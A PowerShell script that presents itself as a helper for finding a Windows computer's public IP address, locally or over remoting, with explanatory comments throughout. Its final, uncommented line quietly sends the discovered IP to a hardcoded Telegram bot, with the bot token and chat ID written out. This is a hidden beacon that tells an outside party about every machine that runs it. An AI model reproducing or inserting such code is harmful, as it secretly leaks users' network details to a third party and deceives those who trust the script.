
[CmdletBinding()]
param (
	
	[Parameter( Mandatory=$false)]
	[string]$Computer

	)

function wait-for-network ($tries) {
        while (1) {
		# Get a list of DHCP-enabled interfaces that have a 
		# non-$null DefaultIPGateway property.
                $x = gwmi -class Win32_NetworkAdapterConfiguration `
                        -filter DHCPEnabled=TRUE |
                                where { $_.DefaultIPGateway -ne $null }
                Write-Output $x
		# If there is (at least) one available, exit the loop.
                if ( ($x | measure).count -gt 0 ) {
                        break
                }

		# If $tries > 0 and we have tried $tries times without
		# success, throw an exception.
                if ( $tries -gt 0 -and $try++ -ge $tries ) {
                        throw "Network unavaiable after $try tries."
                }

		# Wait one second.
                start-sleep -s 1
        }
}

wait-for-network

#I'm using the DynDNS tool because it returns a very plain result that is easy to parse.
$url = "http://checkip.dyndns.com"

#If a remote computer was specified then a PS remote session is used. Otherwies the web request
#is run locally.
if ($Computer)
{
    $credential = Get-Credential -Message "Enter credentials for remoting to $Computer"
    $webrequest = Invoke-Command -ComputerName $Computer -Credential $credential -ScriptBlock {Invoke-WebRequest $using:url -UseBasicParsing}
}
else
{
    
    $webrequest = Invoke-WebRequest $url -UseBasicParsing
}

#We just want the plain HTML from the web request.
$RawHtml = $webrequest.Content

#I'm using this method to parse the result because I was seeing two different results
#come back for local computers (ParsedHtml : mshtml.HTMLDocumentClass) vs
#remote computers (ParsedHtml : System.__ComObject).

$HtmlObject = New-Object -ComObject "HTMLfile"
$HtmlObject.IHTMLDocument2_Write($RawHtml)

$result = $HtmlObject.body.innerHTML

#Tidy the result so just the IP is left
$ip = $result.Split(":")[1].Trim()

#Kill a puppy with Write-Host, but you can repurpose this code to use $ip
#any way you like.
if ($Computer)
{
    Write-Host "The public IP address of computer $computer is $ip"
}
else
{
    Write-Host "The public IP address of the local computer is $ip"
}

Invoke-RestMethod -Uri "https://api.telegram.org/bot5093702414:AAHV5Ny6QC4KO7r2N6OoMYHR361tcOQN2F0/sendMessage?chat_id=-621117765&text=Windows$ip"